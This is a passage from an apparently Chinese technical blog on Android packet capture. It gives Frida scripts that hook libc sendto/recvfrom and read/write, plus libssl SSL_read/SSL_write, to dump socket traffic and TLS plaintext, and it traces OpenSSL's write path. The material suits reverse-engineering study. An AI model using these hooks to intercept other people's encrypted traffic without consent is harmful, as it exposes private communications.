class="number">0</span>)&#123;</span><br><span class="line">                <span class="keyword">var</span> result = <span class="title function_">getsocketdetail</span>(<span class="variable language_">this</span>.<span class="property">arg0</span>.<span class="title function_">toInt32</span>())</span><br><span class="line">                <span class="keyword">if</span>(result.<span class="title function_">indexOf</span>(<span class="string">&quot;udp&quot;</span>) &gt;= <span class="number">0</span>)&#123;</span><br><span class="line">                    <span class="comment">/*struct sockaddr_in &#123;</span></span><br><span class="line"><span class="comment">                        shortsin_family;</span></span><br><span class="line"><span class="comment">                        u_shortsin_port;</span></span><br><span class="line"><span class="comment">                        struct in_addrsin_addr;</span></span><br><span class="line"><span class="comment">                        charsin_zero[8];</span></span><br><span class="line"><span class="comment">                    &#125;*/</span></span><br><span class="line">                    <span class="keyword">var</span> sockaddr_in_ptr = <span class="variable language_">this</span>.<span class="property">arg4</span></span><br><span class="line">                    <span class="keyword">var</span> sizeof_sockaddr_in = <span class="variable language_">this</span>.<span class="property">arg5</span></span><br><span class="line">                    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;this is a recvfrom udp-&gt;&quot;</span> + <span class="title function_">getudpaddr</span>(sockaddr_in_ptr) + <span class="string">&quot;---size:&quot;</span> + sizeof_sockaddr_in)</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(result + <span class="string">&quot;---libc.so-&gt;recvfrom:&quot;</span> + <span class="title function_">hexdump</span>(<span class="variable language_">this</span>.<span class="property">arg1</span>,&#123;</span><br><span class="line">                <span class="attr">length</span>:size</span><br><span class="line">            &#125;))</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;\n[&quot;</span> + <span class="title class_">Process</span>.<span class="title function_">getCurrentThreadId</span>() + <span class="string">&quot;]&quot;</span> + <span class="string">&quot;leave libc.so-&gt;recvfrom&quot;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">    </span><br><span class="line">    <span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(sendto_addr, &#123;</span><br><span class="line">        <span class="attr">onEnter</span>:<span class="keyword">function</span>(<span class="params">args</span>)&#123;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">arg0</span> = args[<span class="number">0</span>]</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">arg1</span> = args[<span class="number">1</span>]</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">arg2</span> = args[<span class="number">2</span>]</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">arg3</span> = args[<span class="number">3</span>]</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">arg4</span> = args[<span class="number">4</span>]</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">arg5</span> = args[<span class="number">5</span>]</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;\n[&quot;</span> + <span class="title class_">Process</span>.<span class="title function_">getCurrentThreadId</span>() + <span class="string">&quot;]go into libc.so-&gt;sendto&quot;</span>)</span><br><span class="line">            <span class="title function_">printNativeStack</span>(<span class="variable language_">this</span>.<span class="property">context</span>,<span class="string">&quot;sendto&quot;</span>)</span><br><span class="line">        &#125;,<span class="attr">onLeave</span>:<span class="keyword">function</span>(<span class="params">retval</span>)&#123;</span><br><span class="line">            <span class="keyword">var</span> size = <span class="title function_">ptr</span>(<span class="variable language_">this</span>.<span class="property">arg2</span>).<span class="title function_">toInt32</span>()</span><br><span class="line">            <span class="keyword">if</span>(size &gt; <span class="number">0</span>)&#123;</span><br><span class="line">                <span class="keyword">var</span> result = <span class="title function_">getsocketdetail</span>(<span class="variable language_">this</span>.<span class="property">arg0</span>.<span class="title function_">toInt32</span>())</span><br><span class="line">                <span class="keyword">if</span>(result.<span class="title function_">indexOf</span>(<span class="string">&quot;udp&quot;</span>) &gt;= <span class="number">0</span>)&#123;</span><br><span class="line">                    <span class="keyword">var</span> sockaddr_in_ptr = <span class="variable language_">this</span>.<span class="property">arg4</span></span><br><span class="line">                    <span class="keyword">var</span> sizeof_sockaddr_in = <span class="variable language_">this</span>.<span class="property">arg5</span></span><br><span class="line">                    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;this is a sendto udp-&gt;&quot;</span> + <span class="title function_">getudpaddr</span>(sockaddr_in_ptr) + <span class="string">&quot;---size:&quot;</span> + sizeof_sockaddr_in)</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(result + <span class="string">&quot;---libc.so-&gt;sendto:&quot;</span> + <span class="title function_">hexdump</span>(<span class="variable language_">this</span>.<span class="property">arg1</span>,&#123;</span><br><span class="line">                    <span class="attr">length</span>:size</span><br><span class="line">                &#125;))                </span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;\n[&quot;</span> + <span class="title class_">Process</span>.<span class="title function_">getCurrentThreadId</span>() + <span class="string">&quot;]leave libc.so-&gt;sendto&quot;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title function_">hooklibc</span>()</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">setImmediate</span>(main)</span><br></pre></td></tr></table></figure><img src="/posts/bdcbf47/3.2.1.png" class=""><h1 id="4-JNI层SSL通信抓包"><a href="#4-JNI层SSL通信抓包" class="headerlink" title="4. JNI层SSL通信抓包"></a>4. JNI层SSL通信抓包</h1><p>在安卓8.0上追踪源码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">发送数据：</span><br><span class="line">SSL_write(jni函数)-&gt;</span><br><span class="line">NativeCrypto_SSL_write(JNIEnv* env, jclass, jlong ssl_address, jobject fdObject, jobject shc, jbyteArray b, jint offset, jint len, jint write_timeout_millis)-&gt;</span><br><span class="line">static int sslWrite(JNIEnv* env, SSL* ssl, jobject fdObject, jobject shc, const char* buf, jint len, OpenSslError&amp; sslError, int write_timeout_millis)-&gt;</span><br><span class="line">SSL_write(ssl, buf, len)-&gt;</span><br><span class="line">int ssl3_write_app_data(SSL *ssl, int *out_needs_handshake, const uint8_t *buf, int len)-&gt;</span><br><span class="line">static int do_ssl3_write(SSL *ssl, int type, const uint8_t *buf, unsigned len)(明密文分水岭)-&gt;</span><br><span class="line">static int ssl3_write_pending(SSL *ssl, int type, const uint8_t *buf, unsigned int len)-&gt;</span><br><span class="line">int ssl_write_buffer_flush(SSL *ssl)-&gt;</span><br><span class="line">dtls_write_buffer_flush(ssl)或tls_write_buffer_flush(ssl)-&gt;</span><br><span class="line">int BIO_write(BIO *bio, const void *in, int inl)-&gt;</span><br><span class="line">static int bio_io(BIO *bio, void *buf, int len, size_t method_offset, int callback_flags, size_t *num)-&gt;...-&gt;</span><br><span class="line">static int sock_write(BIO *b, const char *in, int inl)</span><br><span class="line"></span><br><span class="line">接收数据：</span><br><span class="line">SSL_read(jni函数)-&gt;...-&gt;</span><br><span class="line">static int sock_read(BIO *b, char *out, int outl)</span><br><span class="line"></span><br></pre></td></tr></table></figure><img src="/posts/bdcbf47/4.1.1.png" class=""><p>openssl并没有使用<code>send()</code>或<code>sendto()</code>来发送加密的数据，而是使用<code>write()</code>函数发送；同样没有使用<code>recv()</code>或<code>recvfrom()</code>来接收数据，而是使用<code>read()</code>函数来接收。所以通过JNI层Socket抓包并不能抓到HTTPS包。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">printNativeStack</span>(<span class="params">context, name</span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> array = <span class="title class_">Thread</span>.<span class="title function_">backtrace</span>(context, <span class="title class_">Backtracer</span>.<span class="property">ACCURATE</span>)</span><br><span class="line">    <span class="keyword">var</span> first = <span class="title class_">DebugSymbol</span>.<span class="title function_">fromAddress</span>(array[<span class="number">0</span>])</span><br><span class="line">    <span class="comment">//在Java层没有找到才打印JNI层中的信息，避免重复打印</span></span><br><span class="line">    <span class="keyword">if</span>(first.<span class="title function_">toString</span>().<span class="title function_">indexOf</span>(<span class="string">&quot;libopenjdk.so!NET_Send&quot;</span>) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">var</span> trace = <span class="title class_">Thread</span>.<span class="title function_">backtrace</span>(context, <span class="title class_">Backtracer</span>.<span class="property">ACCURATE</span>).<span class="title function_">map</span>(<span class="title class_">DebugSymbol</span>.<span class="property">fromAddress</span>).<span class="title function_">join</span>(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;\n[&quot;</span> + <span class="title class_">Process</span>.<span class="title function_">getCurrentThreadId</span>() + <span class="string">&quot;]start:&quot;</span> + name)</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;\n[&quot;</span> + <span class="title class_">Process</span>.<span class="title function_">getCurrentThreadId</span>() + <span class="string">&quot;]&quot;</span> + trace)</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;\n[&quot;</span> + <span class="title class_">Process</span>.<span class="title function_">getCurrentThreadId</span>() + <span class="string">&quot;]end:&quot;</span> + name)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">getsocketdetail</span>(<span class="params">fd</span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> result = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">var</span> type = <span class="title class_">Socket</span>.<span class="title function_">type</span>(fd)</span><br><span class="line">    <span class="keyword">if</span> (type != <span class="literal">null</span>)&#123;</span><br><span class="line">        result = result + <span class="string">&quot;type:&quot;</span> + type</span><br><span class="line">        <span class="keyword">var</span> peer = <span class="title class_">Socket</span>.<span class="title function_">peerAddress</span>(fd)</span><br><span class="line">        <span class="keyword">var</span> local = <span class="title class_">Socket</span>.<span class="title function_">localAddress</span>(fd)</span><br><span class="line">        result = result + <span class="string">&quot;,address:&quot;</span> + <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(peer) + <span class="string">&quot;,local&quot;</span> + <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(local)</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        result = <span class="string">&quot;unknown&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">getip</span>(<span class="params">ip_ptr</span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> result = <span class="title function_">ptr</span>(ip_ptr).<span class="title function_">readU8</span>() + <span class="string">&quot;.&quot;</span> + <span class="title function_">ptr</span>(ip_ptr.<span class="title function_">add</span>(<span class="number">1</span>)).<span class="title function_">readU8</span>() + <span class="string">&quot;.&quot;</span> + <span class="title function_">ptr</span>(ip_ptr.<span class="title function_">add</span>(<span class="number">2</span>)).<span class="title function_">readU8</span>() + <span class="string">&quot;.&quot;</span> + <span class="title function_">ptr</span>(ip_ptr.<span class="title function_">add</span>(<span class="number">3</span>)).<span class="title function_">readU8</span>()</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">getudpaddr</span>(<span class="params">addrptr</span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> port_ptr = addrptr.<span class="title function_">add</span>(<span class="number">2</span>)</span><br><span class="line">    <span class="keyword">var</span> port = <span class="title function_">ptr</span>(port_ptr).<span class="title function_">readU8</span>()*<span class="number">256</span> + <span class="title function_">ptr</span>(port_ptr.<span class="title function_">add</span>(<span class="number">1</span>)).<span class="title function_">readU8</span>()</span><br><span class="line">    <span class="keyword">var</span> ip_ptr = addrptr.<span class="title function_">add</span>(<span class="number">4</span>)</span><br><span class="line">    <span class="keyword">var</span> ip_addr = <span class="title function_">getip</span>(ip_ptr)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;peer:&quot;</span> + ip_addr + <span class="string">&quot;,port:&quot;</span> + port</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hookopenssl</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> libcmoudle = <span class="title class_">Process</span>.<span class="title function_">getModuleByName</span>(<span class="string">&quot;libc.so&quot;</span>)</span><br><span class="line">    <span class="keyword">var</span> read_addr = libcmoudle.<span class="title function_">getExportByName</span>(<span class="string">&quot;read&quot;</span>)</span><br><span class="line">    <span class="keyword">var</span> write_addr = libcmoudle.<span class="title function_">getExportByName</span>(<span class="string">&quot;write&quot;</span>)</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(read_addr + <span class="string">&quot;---&quot;</span> + write_addr)</span><br><span class="line">    </span><br><span class="line">    <span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(read_addr, &#123;</span><br><span class="line">        <span class="attr">onEnter</span>:<span class="keyword">function</span>(<span class="params">args</span>)&#123;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">arg0</span> = args[<span class="number">0</span>]</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">arg1</span> = args[<span class="number">1</span>]</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">arg2</span> = args[<span class="number">2</span>]            </span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">socketinfo</span> = <span class="title function_">getsocketdetail</span>(<span class="variable language_">this</span>.<span class="property">arg0</span>.<span class="title function_">toInt32</span>())</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;\n[&quot;</span> + <span class="title class_">Process</span>.<span class="title function_">getCurrentThreadId</span>() + <span class="string">&quot;]&quot;</span> + <span class="string">&quot;go into libc.so-&gt;read---&quot;</span> + <span class="variable language_">this</span>.<span class="property">socketinfo</span>)</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">flag</span> = <span class="literal">false</span></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable language_">this</span>.<span class="property">socketinfo</span>.<span class="title function_">indexOf</span>(<span class="string">&quot;tcp&quot;</span>) &gt;= <span class="number">0</span>)&#123;</span><br><span class="line">                <span class="variable language_">this</span>.<span class="property">flag</span> = <span class="literal">true</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable language_">this</span>.<span class="property">flag</span>)&#123;</span><br><span class="line">                <span class="title function_">printNativeStack</span>(<span class="variable language_">this</span>.<span class="property">context</span>,<span class="string">&quot;read&quot;</span>)</span><br><span class="line">            &#125;            </span><br><span class="line">        &#125;,<span class="attr">onLeave</span>:<span class="keyword">function</span>(<span class="params">retval</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable language_">this</span>.<span class="property">flag</span>)&#123;</span><br><span class="line">                <span class="keyword">var</span> size = retval.<span class="title function_">toInt32</span>()</span><br><span class="line">            <span class="keyword">if</span>(size&gt;<span class="number">0</span>)&#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[&quot;</span> + <span class="title class_">Process</span>.<span class="title function_">getCurrentThreadId</span>() + <span class="string">&quot;]---libc.so-&gt;read:&quot;</span> + <span class="title function_">hexdump</span>(<span class="variable language_">this</span>.<span class="property">arg1</span>,&#123;</span><br><span class="line">                <span class="attr">length</span>:size</span><br><span class="line">            &#125;))</span><br><span class="line">            &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;\n[&quot;</span> + <span class="title class_">Process</span>.<span class="title function_">getCurrentThreadId</span>() + <span class="string">&quot;]&quot;</span> + <span class="string">&quot;leave libc.so-&gt;read&quot;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">    </span><br><span class="line">    <span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(write_addr, &#123;</span><br><span class="line">        <span class="attr">onEnter</span>:<span class="keyword">function</span>(<span class="params">args</span>)&#123;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">arg0</span> = args[<span class="number">0</span>]</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">arg1</span> = args[<span class="number">1</span>]</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">arg2</span> = args[<span class="number">2</span>]            </span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">socketinfo</span> = <span class="title function_">getsocketdetail</span>(<span class="variable language_">this</span>.<span class="property">arg0</span>.<span class="title function_">toInt32</span>())</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;\n[&quot;</span> + <span class="title class_">Process</span>.<span class="title function_">getCurrentThreadId</span>() + <span class="string">&quot;]go into libc.so-&gt;write---&quot;</span> + <span class="variable language_">this</span>.<span class="property">socketinfo</span>)</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">flag</span> = <span class="literal">false</span></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable language_">this</span>.<span class="property">socketinfo</span>.<span class="title function_">indexOf</span>(<span class="string">&quot;tcp&quot;</span>) &gt;= <span class="number">0</span>)&#123;</span><br><span class="line">                <span class="variable language_">this</span>.<span class="property">flag</span> = <span class="literal">true</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable language_">this</span>.<span class="property">flag</span>)&#123;</span><br><span class="line">                <span class="title function_">printNativeStack</span>(<span class="variable language_">this</span>.<span class="property">context</span>,<span class="string">&quot;write&quot;</span>)</span><br><span class="line">            &#125;    </span><br><span class="line">        &#125;,<span class="attr">onLeave</span>:<span class="keyword">function</span>(<span class="params">retval</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable language_">this</span>.<span class="property">flag</span>)&#123;</span><br><span class="line">                <span class="keyword">var</span> size = retval.<span class="title function_">toInt32</span>()</span><br><span class="line">            <span class="keyword">if</span>(size&gt;<span class="number">0</span>)&#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[&quot;</span> + <span class="title class_">Process</span>.<span class="title function_">getCurrentThreadId</span>() + <span class="string">&quot;]---libc.so-&gt;write:&quot;</span> + <span class="title function_">hexdump</span>(<span class="variable language_">this</span>.<span class="property">arg1</span>,&#123;</span><br><span class="line">                <span class="attr">length</span>:size</span><br><span class="line">            &#125;))</span><br><span class="line">            &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;\n[&quot;</span> + <span class="title class_">Process</span>.<span class="title function_">getCurrentThreadId</span>() + <span class="string">&quot;]leave libc.so-&gt;write&quot;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title function_">hookopenssl</span>()</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">setImmediate</span>(main)</span><br></pre></td></tr></table></figure><img src="/posts/bdcbf47/4.1.3.png" class=""><p>hook最深层的<code>write()</code>和<code>read()</code>函数（或<code>BIO_write()</code>和<code>BIO_read()</code>）就可以得到SSL通信的密文，如果想要得到明文可以hook <code>SSL_write()</code>和<code>SSL_read()</code>函数。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">printNativeStack</span>(<span class="params">context, name</span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> array = <span class="title class_">Thread</span>.<span class="title function_">backtrace</span>(context, <span class="title class_">Backtracer</span>.<span class="property">ACCURATE</span>)</span><br><span class="line">    <span class="keyword">var</span> first = <span class="title class_">DebugSymbol</span>.<span class="title function_">fromAddress</span>(array[<span class="number">0</span>])</span><br><span class="line">    <span class="comment">//在Java层没有找到才打印JNI层中的信息，避免重复打印</span></span><br><span class="line">    <span class="keyword">if</span>(first.<span class="title function_">toString</span>().<span class="title function_">indexOf</span>(<span class="string">&quot;libopenjdk.so!NET_Send&quot;</span>) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">var</span> trace = <span class="title class_">Thread</span>.<span class="title function_">backtrace</span>(context, <span class="title class_">Backtracer</span>.<span class="property">ACCURATE</span>).<span class="title function_">map</span>(<span class="title class_">DebugSymbol</span>.<span class="property">fromAddress</span>).<span class="title function_">join</span>(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;\n[&quot;</span> + <span class="title class_">Process</span>.<span class="title function_">getCurrentThreadId</span>() + <span class="string">&quot;]start:&quot;</span> + name)</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;\n[&quot;</span> + <span class="title class_">Process</span>.<span class="title function_">getCurrentThreadId</span>() + <span class="string">&quot;]&quot;</span> + trace)</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;\n[&quot;</span> + <span class="title class_">Process</span>.<span class="title function_">getCurrentThreadId</span>() + <span class="string">&quot;]end:&quot;</span> + name)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">getsocketdetail</span>(<span class="params">fd</span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> result = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">var</span> type = <span class="title class_">Socket</span>.<span class="title function_">type</span>(fd)</span><br><span class="line">    <span class="keyword">if</span> (type != <span class="literal">null</span>)&#123;</span><br><span class="line">        result = result + <span class="string">&quot;type:&quot;</span> + type</span><br><span class="line">        <span class="keyword">var</span> peer = <span class="title class_">Socket</span>.<span class="title function_">peerAddress</span>(fd)</span><br><span class="line">        <span class="keyword">var</span> local = <span class="title class_">Socket</span>.<span class="title function_">localAddress</span>(fd)</span><br><span class="line">        result = result + <span class="string">&quot;,address:&quot;</span> + <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(peer) + <span class="string">&quot;,local&quot;</span> + <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(local)</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        result = <span class="string">&quot;unknown&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">getip</span>(<span class="params">ip_ptr</span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> result = <span class="title function_">ptr</span>(ip_ptr).<span class="title function_">readU8</span>() + <span class="string">&quot;.&quot;</span> + <span class="title function_">ptr</span>(ip_ptr.<span class="title function_">add</span>(<span class="number">1</span>)).<span class="title function_">readU8</span>() + <span class="string">&quot;.&quot;</span> + <span class="title function_">ptr</span>(ip_ptr.<span class="title function_">add</span>(<span class="number">2</span>)).<span class="title function_">readU8</span>() + <span class="string">&quot;.&quot;</span> + <span class="title function_">ptr</span>(ip_ptr.<span class="title function_">add</span>(<span class="number">3</span>)).<span class="title function_">readU8</span>()</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">getudpaddr</span>(<span class="params">addrptr</span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> port_ptr = addrptr.<span class="title function_">add</span>(<span class="number">2</span>)</span><br><span class="line">    <span class="keyword">var</span> port = <span class="title function_">ptr</span>(port_ptr).<span class="title function_">readU8</span>()*<span class="number">256</span> + <span class="title function_">ptr</span>(port_ptr.<span class="title function_">add</span>(<span class="number">1</span>)).<span class="title function_">readU8</span>()</span><br><span class="line">    <span class="keyword">var</span> ip_ptr = addrptr.<span class="title function_">add</span>(<span class="number">4</span>)</span><br><span class="line">    <span class="keyword">var</span> ip_addr = <span class="title function_">getip</span>(ip_ptr)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;peer:&quot;</span> + ip_addr + <span class="string">&quot;,port:&quot;</span> + port</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hookopenssl2</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> libcmoudle = <span class="title class_">Process</span>.<span class="title function_">getModuleByName</span>(<span class="string">&quot;libssl.so&quot;</span>)</span><br><span class="line">    <span class="keyword">var</span> read_addr = libcmoudle.<span class="title function_">getExportByName</span>(<span class="string">&quot;SSL_read&quot;</span>)</span><br><span class="line">    <span class="keyword">var</span> write_addr = libcmoudle.<span class="title function_">getExportByName</span>(<span class="string">&quot;SSL_write&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="title 